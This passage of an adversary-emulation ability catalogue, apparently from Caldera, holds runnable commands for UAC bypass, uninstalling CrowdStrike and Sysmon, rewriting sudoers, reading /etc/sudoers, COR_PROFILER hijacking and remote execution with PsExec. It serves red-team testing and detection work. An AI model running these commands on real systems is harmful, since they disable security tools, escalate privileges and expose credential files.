"payloads": [], "parsers": [], "cleanup": ["powershell Stop-Process -Name cmd -Force -ErrorAction Ignore && powershell Stop-Process -Name mmc -Force -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "\"%temp%\\uacme\\56 Akagi64.exe\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control", "ability_id": "ef767bd150ff4c55c23837f0e3be6195", "technique_id": "T1548.002", "tactic": "multiple", "requirements": [], "name": "UACME Bypass Method 56", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: James Forshaw\n\nType:\tAppInfo ALPC\n\nMethod: RAiLaunchAdminProcess and DebugObject\n\nTarget:\tAttacker defined\n\nComponent:\tAttacker defined\n\nImplementation:\tucmDebugObjectMethod\n\nUCM Method:\tUacMethodDebugObject\n\nhttps://github.com/hfiref0x/UACME\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["powershell Stop-Process -Name cmd -Force -ErrorAction Ignore && powershell Stop-Process -Name mmc -Force -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "\"%temp%\\uacme\\59 Akagi64.exe\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control", "ability_id": "44dfbc0aace944657118f7287b828da2", "technique_id": "T1548.002", "tactic": "multiple", "requirements": [], "name": "UACME Bypass Method 59", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Enigma0x3/bytecode77 derivative by Nassim Asrir\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\slui.exe, \\system32\\changepk.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmShellRegModMethod\n\nUCM Method:\tUacMethodDebugObject\n\nhttps://github.com/hfiref0x/UACME\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["powershell Stop-Process -Name cmd -Force -ErrorAction Ignore && powershell Stop-Process -Name mmc -Force -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "\"%temp%\\uacme\\61 Akagi64.exe\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control", "ability_id": "0bba96f96380dbc1fe2f3f4db148b8c0", "technique_id": "T1548.002", "tactic": "multiple", "requirements": [], "name": "UACME Bypass Method 61", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "find attached usb devices", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "system_profiler SPUSBDataType", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Peripheral Device Discovery", "ability_id": "9b007f62-daa1-44bd-a57d-00c5315ec6fe", "technique_id": "T1120", "tactic": "discovery", "requirements": [], "name": "USB Connected Device Discovery", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Simulates an adversary copying malware to all connected removable drives. \n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["$RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk -filter \"drivetype=2\" | select-object -expandproperty DeviceID; ForEach ($Drive in $RemovableDrives); {; Remove-Item -Path $Drive\\T1091Test1.txt -Force -ErrorAction Ignore; }"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$RemovableDrives=@(); $RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk -filter \"drivetype=2\" | select-object -expandproperty DeviceID; ForEach ($Drive in $RemovableDrives); {; write-host \"Removable Drive Found:\" $Drive; New-Item -Path $Drive/T1091Test1.txt -ItemType \"file\" -Force -Value \"T1091 Test 1 has created this file to simulate malware spread to removable drives.\"; }", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Replication Through Removable Media", "ability_id": "95f9e48ea1fbdac2f1c7c656b655ae4c", "technique_id": "T1091", "tactic": "multiple", "requirements": [], "name": "USB Malware Spread Simulation", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "An adversary may attempt to trick the user into downloading UltraVNC for use as a C2 channel.\nUpon successful execution, UltraVNC will be executed.\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Stop-Process -Name \"vncviewer\" -force -erroraction silentlycontinue"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Start-Process $env:ProgramFiles\\'uvnc bvba\\UltraVnc\\vncviewer.exe'", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Remote Access Software", "ability_id": "13286011c4ad0d577bccb6a85a13982a", "technique_id": "T1219", "tactic": "command-and-control", "requirements": [], "name": "UltraVNC Execution", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "A recent trend by threat actors, once a foothold is established, maintain long term persistence using third party remote services such as UltraViewer to provide the operator with access to the network using legitimate services. \n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Stop-Process -Name \"UltraViewer_Desktop\" -Force -ErrorAction SilentlyContinue"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Start-Process -Wait -FilePath \"$env:temp\\T1219_UltraViewer.exe\" -Argument \"/silent\" -PassThru; Start-Process 'C:\\Program Files (x86)\\UltraViewer\\UltraViewer_Desktop.exe'", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Remote Access Software", "ability_id": "10b46b4b36e03efea62ea69331623358", "technique_id": "T1219", "tactic": "command-and-control", "requirements": [], "name": "UltraViewer - RAT Execution", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Uninstall Crowdstrike Falcon. If the WindowsSensor.exe path is not provided as an argument we need to search for it. Since the executable is located in a folder named with a random guid we need to identify it before invoking the uninstaller.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "if (Test-Path \"C:\\ProgramData\\Package Cache\\{7489ba93-b668-447f-8401-7e57a6fe538d}\\WindowsSensor.exe\") {. \"C:\\ProgramData\\Package Cache\\{7489ba93-b668-447f-8401-7e57a6fe538d}\\WindowsSensor.exe\" /repair /uninstall /quiet } else { Get-ChildItem -Path \"C:\\ProgramData\\Package Cache\" -Include \"WindowsSensor.exe\" -Recurse | % { $sig=$(Get-AuthenticodeSignature -FilePath $_.FullName); if ($sig.Status -eq \"Valid\" -and $sig.SignerCertificate.DnsNameList -eq \"CrowdStrike, Inc.\") { . \"$_\" /repair /uninstall /quiet; break;}}}", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify Tools", "ability_id": "2e9acde621e7768a73c1b9a1157c444d", "technique_id": "T1562.001", "tactic": "defense-evasion", "requirements": [], "name": "Uninstall Crowdstrike Falcon on Windows", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Uninstall Sysinternals Sysmon for Defense Evasion\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["sysmon -i -accepteula >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "sysmon -u", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify Tools", "ability_id": "0dd0e92f8334f31545e8545065a059da", "technique_id": "T1562.001", "tactic": "defense-evasion", "requirements": [], "name": "Uninstall Sysmon", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers; sudo visudo -c -f /etc/sudoers", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers; sudo visudo -c -f /etc/sudoers", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Abuse Elevation Control Mechanism: Sudo and Sudo Caching", "ability_id": "f1debf348737a5744911d71cec0ca4ea", "technique_id": "T1548.003", "tactic": "multiple", "requirements": [{"relationship_match": [{"source": "sudo"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "Unlimited sudo cache timeout", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Unloads the Sysinternals Sysmon filter driver without stopping the Sysmon service. To verify successful execution, o verify successful execution,\nrun the prereq_command's and it should fail with an error of \"sysmon filter must be loaded\".\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["sysmon -u -i > nul 2>&1 && sysmon -i -accepteula -i > nul 2>&1 && %temp%\\Sysmon\\sysmon.exe -u > nul 2>&1 && %temp%\\Sysmon\\sysmon.exe -accepteula -i > nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "fltmc.exe unload SysmonDrv", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify Tools", "ability_id": "b0994d3924347a714de2bbfb269f3fbd", "technique_id": "T1562.001", "tactic": "defense-evasion", "requirements": [], "name": "Unload Sysmon Filter Driver", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Ursnif downloads additional modules from the C&C server and saves these in the registry folder HKEY_CURRENT_USER\\Software\\AppDataLow\\Software\\Microsoft\\\nMore information - https://blog.trendmicro.com/trendlabs-security-intelligence/phishing-campaign-uses-hijacked-emails-to-deliver-ursnif-by-replying-to-ongoing-threads/\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg delete HKCU\\Software\\AppDataLow\\Software\\Microsoft\\3A861D62-51E0-15700F2219A4 /va /f >nul 2>&1 && reg delete HKCU\\Software\\AppDataLow\\Software\\Microsoft\\3A861D62-51E0-15700F2219A4 /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add HKCU\\Software\\AppDataLow\\Software\\Microsoft\\3A861D62-51E0-15700F2219A4 /v comsxRes /t REG_BINARY  /d 72656463616e617279 /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "9e45dba442d5aa5c977f2086a09c2d0c", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "Ursnif Malware Registry Key Creation", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Requires having Sysinternals installed, path to sysinternals is one of the input input_arguments\nWill start a process on a remote host.\n\nUpon successful execution, cmd will utilize psexec.exe to spawn calc.exe on a remote endpoint (default:localhost).\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "C:\\PSTools\\PsExec.exe \\\\localhost -u DOMAIN\\Administrator -p P@ssw0rd1 -accepteula \"C:\\Windows\\System32\\calc.exe\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "System Services: Service Execution", "ability_id": "50d199543d7813b877e299ac48c908ba", "technique_id": "T1569.002", "tactic": "execution", "requirements": [], "name": "Use PsExec to execute a command on a remote host", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Requires having RemCom installed, path to RemCom is one of the input input_arguments\nWill start a process on a remote host.\nUpon successful execution, cmd will utilize RemCom.exe to spawn calc.exe on a remote endpoint (default:localhost).\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "\"$pathtoatomicsfolder\\T1569.002\\bin\\remcom.exe\" \\\\localhost /user:Administrator /pwd:P@ssw0rd1 cmd.exe", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "System Services: Service Execution", "ability_id": "753ad1ad41cf59a2d3a7e2972c0d16c4", "technique_id": "T1569.002", "tactic": "execution", "requirements": [], "name": "Use RemCom to execute a command on a remote host", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Using a space before a command causes the command to not be logged in the Bash History file\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "hostname; whoami", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "hostname; whoami", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host: Clear Command History", "ability_id": "8e7c28877a9c7826fece190f185b534c", "technique_id": "T1070.003", "tactic": "defense-evasion", "requirements": [], "name": "Use Space Before Command to Avoid Logging to History", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "SecEdit.exe can be used to export the current local security policy applied to a host.\n[Reference](https://blueteamops.medium.com/secedit-and-i-know-it-595056dee53d)\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "secedit.exe /export /areas SECURITYPOLICY /cfg output_mysecpol.txt", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Password Policy Discovery", "ability_id": "ebc55b8de493510344b6a0e6d34387a3", "technique_id": "T1201", "tactic": "discovery", "requirements": [], "name": "Use of SecEdit.exe to export the local security policy (including the password policy)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Use the PowerShell environment variables to identify the current logged user.", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item -Path .\\CurrentactiveUser.txt -Force"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "[System.Environment]::UserName | Out-File -FilePath .\\CurrentactiveUser.txt ; $env:UserName | Out-File -FilePath .\\CurrentactiveUser.txt -Append", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "System Owner/User Discovery", "ability_id": "2bf75f949823305d3ea815c8e94e9ee3", "technique_id": "T1033", "tactic": "discovery", "requirements": [], "name": "User Discovery With Env Vars PowerShell Script", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Creates user scope environment variables and CLSID COM object to enable a .NET profiler (COR_PROFILER).\nThe unmanaged profiler DLL (`T1574.012x64.dll`) executes when the CLR is loaded by the Event Viewer process.\nAdditionally, the profiling DLL will inherit the integrity level of Event Viewer bypassing UAC and executing `notepad.exe` with high integrity.\nIf the account used is not a local administrator the profiler DLL will still execute each time the CLR is loaded by a process, however,\nthe notepad process will not execute with high integrity.\n\nReference: https://redcanary.com/blog/cor_profiler-for-persistence/\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["83f016_T1574.012x64.dll"], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\" -Recurse -Force -ErrorAction Ignore ; Remove-ItemProperty -Path HKCU:\\Environment -Name \"COR_ENABLE_PROFILING\" -Force -ErrorAction Ignore | Out-Null; Remove-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER\" -Force -ErrorAction Ignore | Out-Null; Remove-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER_PATH\" -Force -ErrorAction Ignore | Out-Null"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Write-Host \"Creating registry keys in HKCU:Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\" -ForegroundColor Cyan; New-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\\InprocServer32\" -Value 83f016_T1574.012x64.dll -Force | Out-Null; New-ItemProperty -Path HKCU:\\Environment -Name \"COR_ENABLE_PROFILING\" -PropertyType String -Value \"1\" -Force | Out-Null; New-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER\" -PropertyType String -Value \"{09108e71-974c-4010-89cb-acf471ae9e2c}\" -Force | Out-Null; New-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER_PATH\" -PropertyType String -Value 83f016_T1574.012x64.dll -Force | Out-Null; Write-Host \"executing eventvwr.msc\" -ForegroundColor Cyan; START MMC.EXE EVENTVWR.MSC", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Hijack Execution Flow: COR_PROFILER", "ability_id": "47782bfea04a05a4b7b1c4b59279b4fb", "technique_id": "T1574.012", "tactic": "multiple", "requirements": [], "name": "User scope COR_PROFILER", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Add data to clipboard to copy off or execute commands from.\n", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["del %temp%\\T1115.txt >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "dir | clip && echo \"T1115\" > %temp%\\T1115.txt && clip < %temp%\\T1115.txt", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Clipboard Data", "ability_id": "70795de7cbb842edb029b3378c27c008", "technique_id": "T1115", "tactic": "collection", "requirements": [], "name": "Utilize Clipboard to store or execute commands from", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Display information about current system processes", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "ps", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "ps", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "get-process", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Process Discovery", "ability_id": "335cea7b-bec0-48c6-adfb-6066070f5f68", "technique_id": "T1057", "tactic": "discovery", "requirements": [], "name": "View Processes", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "View accounts with UID 0\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm -f /tmp/T1087.001.txt 2>/dev/null"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "grep 'x:0:' /etc/passwd > /tmp/T1087.001.txt; cat /tmp/T1087.001.txt 2>/dev/null", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm -f /tmp/T1087.001.txt 2>/dev/null"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "grep 'x:0:' /etc/passwd > /tmp/T1087.001.txt; cat /tmp/T1087.001.txt 2>/dev/null", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Account Discovery: Local Account", "ability_id": "59703a9c143cdc58377b103a1c7acc59", "technique_id": "T1087.001", "tactic": "discovery", "requirements": [], "name": "View accounts with UID 0", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Network Share Discovery", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.json", "parserconfigs": [{"custom_parser_vals": {"json_key": "Path", "json_type": "str"}, "edge": "", "target": "", "source": "domain.smb.share"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Get-SmbShare | ConvertTo-Json", "language": null, "name": "pwsh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.json", "parserconfigs": [{"custom_parser_vals": {"json_key": "Path", "json_type": "str"}, "edge": "", "target": "", "source": "domain.smb.share"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Get-SmbShare | ConvertTo-Json", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Network Share Discovery", "ability_id": "530e47c6-8592-42bf-91df-c59ffbd8541b", "technique_id": "T1135", "tactic": "discovery", "requirements": [], "name": "View admin shares", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "View information about all of the resources that are shared on the local computer Upon execution, avalaible share drives will be displayed in the powershell session", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "net share", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Network Share Discovery", "ability_id": "f247309a5f934b32f2e510eb50409d3b", "technique_id": "T1135", "tactic": "discovery", "requirements": [], "name": "View available share drives", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "View details of queued documents in printer queue", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.printer_queue", "parserconfigs": [{"custom_parser_vals": {}, "edge": "has_size", "target": "host.print.size", "source": "host.print.file"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "lpq -a", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.printer_queue", "parserconfigs": [{"custom_parser_vals": {}, "edge": "has_size", "target": "host.print.size", "source": "host.print.file"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "lpq -a", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Peripheral Device Discovery", "ability_id": "6c91884e-11ec-422f-a6ed-e76774b0daac", "technique_id": "T1120", "tactic": "discovery", "requirements": [], "name": "View printer queue", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "View the shares of a remote host", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.net_view", "parserconfigs": [{"custom_parser_vals": {}, "edge": "has_share", "target": "remote.host.share", "source": "remote.host.fqdn"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "net view \\\\#{remote.host.fqdn} /all", "language": null, "name": "psh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.net_view", "parserconfigs": [{"custom_parser_vals": {}, "edge": "has_share", "target": "remote.host.share", "source": "remote.host.fqdn"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "net view \\\\#{remote.host.fqdn} /all", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Network Share Discovery", "ability_id": "deeac480-5c2a-42b5-90bb-41675ee53c7e", "technique_id": "T1135", "tactic": "discovery", "requirements": [], "name": "View remote shares", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "(requires root)\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm -f /tmp/T1087.001.txt"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "sudo cat /etc/sudoers > /tmp/T1087.001.txt; cat /tmp/T1087.001.txt", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm -f /tmp/T1087.001.txt"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "sudo cat /etc/sudoers > /tmp/T1087.001.txt; cat /tmp/T1087.001.txt", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Account Discovery: Local Account", "ability_id": "ff603d97a57715d3c2a1de941419d661", "technique_id": "T1087.001", "tactic": "discovery", "requirements": [{"relationship_match": [{"source": "sudo"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "View sudoers access", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Determine if the system is virtualized or physical", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "get-wmiobject win32_computersystem | fl model", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Virtualization/Sandbox Evasion: System Checks", "ability_id": "5dc841fd-28ad-40e2-b10e-fb007fe09e81", "technique_id": "T1497.001", "tactic": "discovery", "requirements": [], "name": "Virtual or Real", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Visual Basic execution test, execute vbscript via PowerShell.\n\nWhen successful, system information will be written to $env:TEMP\\T1059.005.out.txt.", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["a771e6_sys_info.vbs"], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item $env:TEMP\\T1059.005.out.txt -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "cscript a771e6_sys_info.vbs > $env:TEMP\\T1059.005.out.txt", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: Visual Basic", "ability_id": "8dffc63a433a6abb131ae70845e66126", "technique_id": "T1059.005", "tactic": "execution", "requirements": [], "name": "Visual Basic script execution to gather local computer information", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Open a .docx file that loads a remote .dotm macro enabled template from https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1221/src/opencalc.dotm \nExecutes the code specified within the .dotm template.\nRequires download of WINWORD found in Microsoft Ofiice at Microsoft: https://www.microsoft.com/en-us/download/office.aspx.  \nDefault docs file opens Calculator.exe when test sucessfully executed, while AV turned off.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["01b633_Calculator.docx"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "start 01b633_Calculator.docx", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Template Injection", "ability_id": "081fccc31e55ea72b25e9914f15921b0", "technique_id": "T1221", "tactic": "defense-evasion", "requirements": [], "name": "WINWORD Remote Template Injection", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test uses wmic.exe to execute a process on the local host.\nWhen the test completes , a new process will be started locally .A notepad application will be started when input is left on default.\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": 